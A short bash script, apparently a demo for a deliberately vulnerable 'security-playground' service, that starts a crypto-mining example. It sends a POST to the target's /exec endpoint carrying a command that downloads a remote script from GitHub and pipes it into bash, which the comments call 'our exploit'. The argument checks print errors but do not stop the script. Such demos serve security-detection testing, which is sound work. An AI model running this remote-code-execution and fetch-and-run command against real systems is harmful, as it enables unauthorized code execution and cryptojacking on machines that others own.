#!/bin/bash
# Script to kick off a crypto mining example through security-playground

# Required parameters are the IP of a Node and then the port
# (Given this is a NodePort Service)

# Error if they don't specify an IP
if [ $1 == "" ]
  then
    echo "Error: No Node IP specified"
fi

# Error if they don't specify port
if [ $2 -eq 0 ]
  then
    echo "Error: No port specified"
fi

echo "1. Kicking off crypto mininng through our exploit"
curl -X POST $1:$2/exec -d 'command=curl https://raw.githubusercontent.com/sysdiglabs/policy-editor-attack/master/run.sh | bash'

